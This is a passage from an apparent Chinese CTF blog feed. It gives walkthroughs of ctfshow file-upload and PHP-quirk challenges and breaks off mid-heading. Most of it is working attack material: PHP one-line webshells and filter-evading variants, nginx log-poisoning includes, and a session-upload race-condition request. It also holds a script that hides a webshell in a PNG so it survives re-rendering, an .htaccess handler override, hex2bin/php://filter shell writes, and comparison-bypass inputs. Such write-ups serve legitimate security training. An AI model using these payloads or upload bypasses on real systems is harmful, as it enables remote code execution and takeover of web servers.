class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB-156-绕过"><a href="#WEB-156-绕过" class="headerlink" title="WEB-156([]绕过)"></a>WEB-156([]绕过)</h1><p>在154~155基础上过滤了<code>[]</code>用<code>&#123;&#125;</code>bypass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST&#123;x&#125;);?&gt;</span><br></pre></td></tr></table></figure><h1 id="WEB-157-159-绕过"><a href="#WEB-157-159-绕过" class="headerlink" title="WEB-157~159({} ; ()绕过)"></a>WEB-157~159({} ; ()绕过)</h1><p>在前面基础上过滤了{}和分号 那我们不写一句话了 直接命令执行读flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`tac ./../f*`;?&gt;` 或者`&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p>159不行 过滤了括号只能用第一种 </p><h1 id="WEB-160-日志包含-绕log"><a href="#WEB-160-日志包含-绕log" class="headerlink" title="WEB-160(日志包含 绕log)"></a>WEB-160(日志包含 绕log)</h1><p><code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code>log用拼接绕过</p><p>然后文件头User-Agent包含一句话木马即可</p><h1 id="WEB-161-文件头检测绕过"><a href="#WEB-161-文件头检测绕过" class="headerlink" title="WEB-161(文件头检测绕过)"></a>WEB-161(文件头检测绕过)</h1><p>在160基础上增加了检测文件头的函数 增加图片头GIF89a绕过即可</p><p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688365737442-53a194dd-aeea-4986-ba00-86ec08a101d4.png" alt="img"></p><p>其实GIF89a就是我们一般见到的gif动图的文件头</p><p>通过010对一个gif图分析就能看到文件头</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688444635540-b95e7f67-b6d6-4d61-9ecd-040a9d0124a4.png" alt="img"></p><h1 id="WEB-162-163-session-条件竞争"><a href="#WEB-162-163-session-条件竞争" class="headerlink" title="WEB-162~163(session 条件竞争)"></a>WEB-162~163(session 条件竞争)</h1><p>之前别的模块做过类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;http://953ea87b-dff4-45be-adac-15a38b1fd7e3.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上传一个文件改数据包：</p><p>加上木马和<code>Cookie:PHPSESSID=ban</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">953</span>ea87b-dff4-<span class="number">45</span>be-adac-<span class="number">15</span>a38b1fd7e3.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">352</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: <span class="literal">null</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybDQ9C8w3UWP0rUGY</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Cookie:PHPSESSID=ban</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php system(&#x27;cat ../f*&#x27;);?&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.png&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">GIF89a</span></span><br><span class="line"><span class="comment">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundarybDQ9C8w3UWP0rUGY--</span></span><br></pre></td></tr></table></figure><p>然后再将.user.ini改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/tmp/sess_ban</span><br></pre></td></tr></table></figure><p>然后两个条件竞争一直发包即可</p><h1 id="WEB-164（PNG-二次渲染）"><a href="#WEB-164（PNG-二次渲染）" class="headerlink" title="WEB-164（PNG 二次渲染）"></a>WEB-164（PNG 二次渲染）</h1><p>随便上传一个图片 然后我们可以访问<code>http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png</code> 可以看到是通过文件包含形式</p><p>二次渲染就是我们夹杂在图像里的木马上传后会被删掉 我们需要下载下来找到它不删除的地方把我们的木马加进去然后利用文件包含执行我们的木马</p><p>因为我的php是8.2.0的版本 修改ini文件 <code>extension=gd</code>把前面的<code>;</code>去掉</p><p>然后才能用这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">            <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">            <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">            <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">            <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">            <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">            <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">            <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;1.png&#x27;</span>);  <span class="comment">//要修改的图片的路径 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//imagepng($img,&#x27;1.png&#x27;);  要修改的图片的路径,1.png是使用的文件，可以不存在</span></span><br><span class="line"><span class="comment">//会在目录下自动创建一个1.png图片</span></span><br><span class="line"><span class="comment">//图片脚本内容：$_GET[0]($_POST[1]);</span></span><br><span class="line"><span class="comment">//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688451112419-1980ecb8-25aa-44d8-b6fe-14b539de29fc.png" alt="img"></p><p>可以看到木马是以短标签写进去的</p><p>抓包执行即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /download.php?image=<span class="number">4</span>a47a0db6e60853dedfcfdf08a5ca249.png&amp;<span class="number">0</span>=system HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">6</span>a0dd0db-<span class="number">7621</span>-<span class="number">467</span>f-<span class="number">8</span>c76-dd8bd63732b6.challenge.ctf.show</span><br><span class="line">Content-Length: <span class="number">14</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://6a0dd0db-7621-467f-8c76-dd8bd63732b6.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.2.729509020.1680361470</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1=cat+flag.php</span></span><br></pre></td></tr></table></figure><h1 id="WEB-165-jpg二次渲染"><a href="#WEB-165-jpg二次渲染" class="headerlink" title="WEB-165(jpg二次渲染)"></a>WEB-165(jpg二次渲染)</h1><p>傻逼题 没啥好说的</p><h1 id="WEB-166-zip"><a href="#WEB-166-zip" class="headerlink" title="WEB-166(zip)"></a>WEB-166(zip)</h1><p>给zip后面添加一句话上传 然后包含执行 题目环境有问题 返回包是空的</p><h1 id="WEB-167-htaccess"><a href="#WEB-167-htaccess" class="headerlink" title="WEB-167(.htaccess)"></a>WEB-167(.htaccess)</h1><p>报500错误 环境有问题 无语了</p><p>.htaccess也是php的配置文件 是一个局部配置文件 只对该文件所在目录下的文件起作用</p><p>我们可以上传上去jpg文件 但是不是php文件 无法解析</p><p>所以我们需要.htaccess这个文件去将我们的jpg文件解析成php文件 </p><p>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;1.jpg&quot;</span>&gt; <span class="comment">//需要解析的文件名</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h1 id="WEB-168-免杀"><a href="#WEB-168-免杀" class="headerlink" title="WEB-168(免杀)"></a>WEB-168(免杀)</h1><p>过滤了eval get post system</p><p>paylaod:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_REQUEST</span>[<span class="number">1</span>]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_REQUEST</span>[x]`;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_REQUEST</span>[<span class="number">1</span>](<span class="variable">$_REQUEST</span>[<span class="number">2</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;(<span class="variable">$a</span>)(<span class="string">&#x27;ls ../&#x27;</span>);    <span class="comment">//拼接</span></span><br></pre></td></tr></table></figure><p>当时用反引号做的时候一直在想为什么返回包是空白 后来才想到这个反引号没有回显 要用echo一下 或者搭配短标签</p><h1 id="WEB-169-WEB-170-日志包含"><a href="#WEB-169-WEB-170-日志包含" class="headerlink" title="WEB-169~WEB-170(日志包含)"></a>WEB-169~WEB-170(日志包含)</h1><p>可以上传php文件到upload下然后上传user.ini 里面的内容指向nginx的日志文件 然后请求头写入一句话木马 去包含访问即可</p><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>真被某些题环境搞心态了 </p><p>继续下一大陆 sql注入！！！！！！！！！！！！！！！！！！！</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-php特性</title>
      <link href="/post/61d76257.html"/>
      <url>/post/61d76257.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-php特性</p><span id="more"></span><h1 id="WEB-89-数组绕正则"><a href="#WEB-89-数组绕正则" class="headerlink" title="WEB-89(数组绕正则)"></a>WEB-89(数组绕正则)</h1><p>需要我们输入数字但是正则匹配不能输入数字 通过数字bypass preg_match()即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure><h1 id="WEB-90-92-intval十六进制"><a href="#WEB-90-92-intval十六进制" class="headerlink" title="WEB-90,92(intval十六进制)"></a>WEB-90,92(intval十六进制)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688001800190-41a53fa2-0b5d-493c-87c5-1a02b998984b.png" alt="img"></p><p>用16进制即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117c</span><br></pre></td></tr></table></figure><h1 id="WEB-91-多行匹配绕过"><a href="#WEB-91-多行匹配绕过" class="headerlink" title="WEB-91(多行匹配绕过)"></a>WEB-91(多行匹配绕过)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^php$/im&#x27;, $a)</span><br></pre></td></tr></table></figure><p><code>^</code>:匹配php开头</p><p><code>$</code>:匹配php结尾</p><p><code>i</code>：大小写</p><p><code>m</code>:多行匹配</p><p>所以用换行符<code>%0a</code>绕过就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=a%0aphp</span><br></pre></td></tr></table></figure><h1 id="WEB-93-intval八进制"><a href="#WEB-93-intval八进制" class="headerlink" title="WEB-93(intval八进制)"></a>WEB-93(intval八进制)</h1><p>和90，92一样不过这次waf了字母用八进制bypass即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br></pre></td></tr></table></figure><h1 id="WEB-94-intval小数点"><a href="#WEB-94-intval小数点" class="headerlink" title="WEB-94(intval小数点)"></a>WEB-94(intval小数点)</h1><p>不能0开头也就不能用八进制了，用小数点即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=4476.0</span><br></pre></td></tr></table></figure><h1 id="WEB-95-intval空格"><a href="#WEB-95-intval空格" class="headerlink" title="WEB-95(intval空格)"></a>WEB-95(intval空格)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688004410684-16da55e9-452a-47f0-81d4-7bc609301c4f.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=+010574</span><br><span class="line">?num= 010574</span><br><span class="line">?num=%20010574</span><br></pre></td></tr></table></figure><h1 id="WEB-96-路径"><a href="#WEB-96-路径" class="headerlink" title="WEB-96(路径)"></a>WEB-96(路径)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure><p><code>./</code>表示当前路径下</p><h1 id="WEB-97-md5"><a href="#WEB-97-md5" class="headerlink" title="WEB-97(md5)"></a>WEB-97(md5)</h1><p>经典题型了，不多说</p><p>数组 或者 直接去找0e开头的payload都可以</p><p>post:<code>a[]=1&amp;b[]=2</code></p><h1 id="WEB-98-三元运算符"><a href="#WEB-98-三元运算符" class="headerlink" title="WEB-98(三元运算符)"></a>WEB-98(三元运算符)</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688091408059-222ec5ac-7d19-4d00-81d7-ed3ad0903d6d.png" alt="img"></p><p>不用管中间的 只看第一行和第二行</p><p>当我们提交一个get传参就会让其等于post传参的值 这里用到了取地址符 直接用c的知识去理解就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;</span><br><span class="line">highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);</span><br></pre></td></tr></table></figure><p>所以payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?HTTP_FLAG=flag</span><br><span class="line">post:HTTP_FLAG=flag</span><br></pre></td></tr></table></figure><h1 id="WEB-99-in-array"><a href="#WEB-99-in-array" class="headerlink" title="WEB-99(in_array)"></a>WEB-99(in_array)</h1><p>主要是in_array这个函数 这个函数是检测一个字符是否在一个数组中 </p><p>如果这个函数不设置第三个参数 则表示在检测中不会检查要检测的值是否与数组中的值类型相同 并且自动转换</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688093098547-696073aa-4215-4dea-8a30-947858c0ce4f.png" alt="img"></p><p>所以我们输入1.php最后也被会认为是1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:?n=1.php</span><br><span class="line">post:content=&lt;?php @eval($_POST[x]);</span><br></pre></td></tr></table></figure><h1 id="WEB-100-运算符优先级"><a href="#WEB-100-运算符优先级" class="headerlink" title="WEB-100(运算符优先级)"></a>WEB-100(运算符优先级)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp; &gt; || &gt; = &gt; and &gt; or</span><br></pre></td></tr></table></figure><p>&#x3D;的运算符比and高</p><p>对于v0的值只需要看v1就可以v2,v3是干扰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=print_r($ctfshow)&amp;v3=;</span><br></pre></td></tr></table></figure><h1 id="WEB-101-反射类"><a href="#WEB-101-反射类" class="headerlink" title="WEB-101(反射类)"></a>WEB-101(反射类)</h1><p>反射类之前做题有遇到过</p><p>原理：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094287598-543d0f24-a471-4c46-9e78-ea12c3a25e91.png" alt="img"></p><p>一个简单的demo来理解payload</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688094259742-560322f7-8861-4ca4-ab38-e3ac4bf26c9a.png" alt="img"></p><p>payload：<code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p><h1 id="WEB-102-103-hex2bin"><a href="#WEB-102-103-hex2bin" class="headerlink" title="WEB-102~103(hex2bin)"></a>WEB-102~103(hex2bin)</h1><p>利用数字 hex2bin()函数 写shell</p><p>然后再用伪协议base64写解码 将shell写进去 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`cat *`;</span><br></pre></td></tr></table></figure><p>payload给的通过base64编码在转为16进制 刚好为纯数字 其他的payload可能夹杂字母 挺巧妙的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v2=<span class="number">115044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-</span></span><br><span class="line">decode/resource=<span class="number">1</span>.php</span><br><span class="line">post：v1=hex2bin</span><br></pre></td></tr></table></figure><h1 id="WEB-104，106-弱相等"><a href="#WEB-104，106-弱相等" class="headerlink" title="WEB-104，106(弱相等)"></a>WEB-104，106(弱相等)</h1><p>网上随便找0e开头的值即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v2=aaK1STfY</span><br></pre></td></tr></table></figure><p>post <code>v1=aaO8zKZF</code></p><h1 id="WEB-105-变量覆盖"><a href="#WEB-105-变量覆盖" class="headerlink" title="WEB-105(变量覆盖)"></a>WEB-105(变量覆盖)</h1><p>出口其实是这里 一开始没弄明白 其实题目一开始进去内容就是error报出来的 真该死啊我</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <code>?suces=flag</code></p><p>post：<code>error=suces</code></p><h1 id="WEB-107（parse-str）"><a href="#WEB-107（parse-str）" class="headerlink" title="WEB-107（parse_str）"></a>WEB-107（parse_str）</h1><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688102102333-8c35f4a6-9b9e-4b2a-a1b0-747d250d7998.png" alt="img"></p><p>一个逻辑问题</p><p>post:<code>v1=flag=0cc175b9c0f1b6a831c399e269772661</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v3=a</span><br></pre></td></tr></table></figure><p>其中散列值是a的md5值</p><h1 id="WEB-108-ereg绕过"><a href="#WEB-108-ereg绕过" class="headerlink" title="WEB-108(ereg绕过)"></a>WEB-108(ereg绕过)</h1><p>ereg 是一个已经过时的函数，用于进行正则表达式的匹配。它用于检查给定的字符串是否与指定的正则表达式模式匹配。  </p><p>在php5.3.0标记为过时并且在7.0.0完全移除</p><p>他的功能就被preg_match代替</p><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure><h1 id="WEB-109-Exception类"><a href="#WEB-109-Exception类" class="headerlink" title="WEB-109(Exception类)"></a>WEB-109(Exception类)</h1><p>发现这个反射类和异常类还能配合命令执行函数一起用真的长见识了</p><h2 id="方法一-反射类"><a href="#方法一-反射类" class="headerlink" title="方法一 反射类"></a>方法一 反射类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688103095547-7f1b0169-dc56-4574-8e5c-450fa942d6c9.png" alt="img"></p><h2 id="方法二-异常类"><a href="#方法二-异常类" class="headerlink" title="方法二 异常类"></a>方法二 异常类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure><h1 id="WEB-110-原生类"><a href="#WEB-110-原生类" class="headerlink" title="WEB-110 (原生类)"></a>WEB-110 